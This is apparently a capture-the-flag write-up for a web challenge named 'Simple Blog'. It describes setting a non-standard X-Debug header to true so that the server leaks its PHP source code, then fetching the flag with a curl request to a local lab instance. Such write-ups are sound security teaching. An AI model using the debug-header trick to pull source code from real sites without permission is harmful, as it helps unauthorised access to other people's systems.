# Simple Blog (100 points)

Simple blog consisted of a single webpage with no dynamic content.

The key to the challenge was to notice a `X-Debug` header
in the server response :

```
< HTTP/1.1 200 OK
< Date: Thu, 09 Nov 2017 14:10:44 GMT
< Server: Apache/2.4.10 (Debian)
< X-Powered-By: PHP/7.0.23
< X-Debug: false
< Vary: Accept-Encoding
< Content-Length: 5232
< Content-Type: text/html; charset=UTF-8
```

In fact, all the headers here were [common](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields) with the exception of `X-Debug`.

Since the header is set to `false`, our goal is to set it to `true` and
see what happens.


We can do this by sending a request with a `X-Debug: true` header.
If done properly, the webapp gives us the source code!

Here's the important part :
```
<?php
  if ($_GET['i_want_a'] == 'flag') {
    echo $flag;
    echo "<br><img src='img/cat.jpg'>";
  }
?>
```

So all we have to do is send a request to http://localhost:19000/?i_want_a=flag
in order to obtain our flag.

```
$ curl http://localhost:19000/?i_want_a=flag | grep HF
    HF-54f52fd283fc0a82e81856fb7f64fc56<br><img src='img/cat.jpg'>  </center>

```
